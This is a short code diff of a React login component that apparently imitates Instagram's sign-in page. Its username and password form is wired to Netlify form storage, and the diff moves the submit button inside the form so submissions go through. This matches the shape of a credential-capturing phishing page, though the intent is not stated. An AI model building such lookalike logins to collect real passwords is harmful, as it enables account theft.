@@ -20,9 +20,8 @@ const  Upper = () => {
               </div>
              <form
                 name ="username"
-                method ="post"
+                method ="POST"
                 data-netlify="true"
-                onSubmit="submit"
                >
                <label id ='username2'>
               <div id='username'>
@@ -35,14 +34,15 @@ const  Upper = () => {
                    <input id="psinp" type="text" size={31} placeholder=" password" />
                 </label>
                 </div>
-               </form>
+               
 
               <div id="forgotpas">
                  Forgot password?
              </div>
 
                 <button type="submit" id="button">Log In</button> 
-            
+            </form>
+
             <div id="noacct">
                 Don't have an account ?  
                 <a id="linka" href="https://www.instagram.com/">
